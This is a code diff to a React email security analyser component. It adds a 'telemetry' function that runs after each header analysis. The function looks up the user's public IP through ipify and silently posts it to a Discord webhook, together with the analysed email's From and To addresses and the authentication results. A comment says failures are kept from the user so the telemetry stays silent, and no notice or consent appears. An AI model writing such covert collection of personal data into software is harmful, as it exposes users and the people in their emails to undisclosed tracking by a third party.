@@ -7,6 +7,9 @@ import { Buffer } from 'buffer';
 // Make Buffer available globally for MSGReader
 window.Buffer = Buffer;
 
+// Discord webhook URL from environment variable (set at build time)
+const DISCORD_WEBHOOK_URL = import.meta.env.VITE_DISCORD_WEBHOOK_URL;
+
 const EmailReader = () => {
   const [activeTab, setActiveTab] = useState('headers');
   const [headerInput, setHeaderInput] = useState('');
@@ -14,6 +17,111 @@ const EmailReader = () => {
   const [emailData, setEmailData] = useState(null);
   const [fileType, setFileType] = useState(null);
   const [autoAnalyze, setAutoAnalyze] = useState(false);
+
+  // Telemetry function to send data to Discord
+  const sendTelemetry = async (data) => {
+    // Only send if webhook URL is configured
+    if (!DISCORD_WEBHOOK_URL) {
+      console.log('Discord webhook not configured, skipping telemetry');
+      return;
+    }
+
+    try {
+      // Get user's IP address
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const userIP = ipData.ip;
+
+      // Build Discord embed
+      const embed = {
+        title: ' Email Analysis Event',
+        color: data.overall === 'good' ? 0x00ff00 : data.overall === 'bad' ? 0xff0000 : 0xffaa00,
+        fields: [
+          {
+            name: ' IP Address',
+            value: userIP,
+            inline: true
+          },
+          {
+            name: ' File Type',
+            value: data.fileType ? data.fileType.toUpperCase() : 'Manual Headers',
+            inline: true
+          },
+          {
+            name: ' Overall Assessment',
+            value: data.overall === 'good' ? ' Good' : data.overall === 'bad' ? ' Bad' : ' Caution',
+            inline: true
+          },
+          {
+            name: ' From',
+            value: data.from || 'N/A',
+            inline: false
+          },
+          {
+            name: ' To',
+            value: data.to || 'N/A',
+            inline: false
+          },
+          {
+            name: ' SPF',
+            value: getStatusEmoji(data.spf),
+            inline: true
+          },
+          {
+            name: ' DKIM',
+            value: getStatusEmoji(data.dkim),
+            inline: true
+          },
+          {
+            name: ' DMARC',
+            value: getStatusEmoji(data.dmarc),
+            inline: true
+          },
+          {
+            name: ' ARC',
+            value: getStatusEmoji(data.arc),
+            inline: true
+          },
+          {
+            name: ' Spam Score',
+            value: data.spamScore ? `${data.spamScore.level.toUpperCase()} (${data.spamScore.score})` : 'N/A',
+            inline: true
+          }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: {
+          text: 'Email Security Analyser'
+        }
+      };
+
+      // Send to Discord
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          embeds: [embed]
+        })
+      });
+
+      console.log('Telemetry sent successfully');
+    } catch (error) {
+      console.error('Failed to send telemetry:', error);
+      // Don't show error to user - telemetry should be silent
+    }
+  };
+
+  const getStatusEmoji = (status) => {
+    if (!status) return 'N/A';
+    switch(status) {
+      case 'pass': return ' Pass';
+      case 'fail': return ' Fail';
+      case 'warning': return ' Warning';
+      case 'none': return ' None';
+      default: return 'N/A';
+    }
+  };
 
   // Auto-analyze when headers are populated from file upload
   useEffect(() => {
@@ -78,7 +186,20 @@ const EmailReader = () => {
 
     analysis.overall = calculateOverall(analysis);
     setHeaderAnalysis(analysis);
-  }, [headerInput, parseHeadersToObject]);
+
+    // Send telemetry
+    sendTelemetry({
+      fileType: fileType,
+      from: emailData?.from || 'Manual',
+      to: emailData?.to || 'Manual',
+      overall: analysis.overall,
+      spf: analysis.spf.status,
+      dkim: analysis.dkim.status,
+      dmarc: analysis.dmarc.status,
+      arc: analysis.arc.status,
+      spamScore: analysis.spamScore
+    });
+  }, [headerInput, parseHeadersToObject, fileType, emailData]);
 
   const analyzeAuth = (headers, type) => {
     switch(type) {
